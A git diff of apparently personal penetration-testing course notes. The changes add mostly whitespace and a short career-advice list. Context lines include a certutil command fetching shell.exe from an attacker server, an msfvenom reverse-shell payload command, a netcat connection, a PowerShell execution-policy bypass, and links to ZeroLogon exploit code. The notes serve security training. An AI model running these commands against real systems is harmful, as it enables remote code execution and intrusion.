@@ -148,6 +148,7 @@ password spraying - using known usernames against unknown passwd
 
 
 
+
 #New Capstone
 - Download machines for vm
        -Blue, Academy, Dev, Butler, Blackpearl
@@ -156,6 +157,7 @@ password spraying - using known usernames against unknown passwd
 ffuf -w wordlistpath:FUZZ -u http://10.10.4.4/FUZZ
 certutil.exe -urlcache -f http://serverip/shell.exe shell.exe
 dnsrecon -r 127.0.0.0/24 -n myip -d domain
+
 
 
 
@@ -218,6 +220,7 @@ kali    - nc -nv 192.168.1.100 9999
         
         #gen shellcode and get root
         msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+
 
 
 
@@ -426,6 +429,8 @@ look for websites in scope if scans take too long
 default creds in printers, jenkins, etc
 
 
+
+
 Post Compromise enumeration
 
 AzureHound
@@ -466,6 +471,8 @@ powershell -ep bypass
 from browser
 upload data(file)
 queries
+
+
 
 
 Post Compromise attacks
@@ -636,6 +643,9 @@ What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html
 dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
 SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472
 
+
+
+
 conclusion
 Resources for this video:
 Active Directory Security Blog: https://adsecurity.org/
@@ -685,6 +695,7 @@ Cleanup - remove executables, scripts, added files
 
 
 
+
 #Web application enumeration
 Finding subdomains
        Assetfinder
@@ -717,6 +728,7 @@ Automating enum
 Hunting
        https://www.youtube.com/watch?v=uKWu6yhnhbQ
        https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA
+
 
 
 
@@ -816,6 +828,7 @@ docker start webgoat
 
 
 
+
 #Wireless penetration testing
 Wired Equivalent Privacy (WEP)
 Wi-Fi Protected Access ii (WPA2 PSK(pre shared key))
@@ -841,6 +854,7 @@ process:
 
 
 
+
 #Legal documents and report writing
 sales
        Mutual non-disclosure agreement(NDA)
@@ -854,3 +868,13 @@ After testing
 
 pentest report writing      
 https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report
+
+
+
+Career advice
+don't be complacent, stay motivated, learning
+apply even for the unqualified
+apply to those that meet your criteria(what you want)
+write Questions you have no answers from interview
+be the dumbest in the room(if you aren't it's time to leave)
+network(who you know)
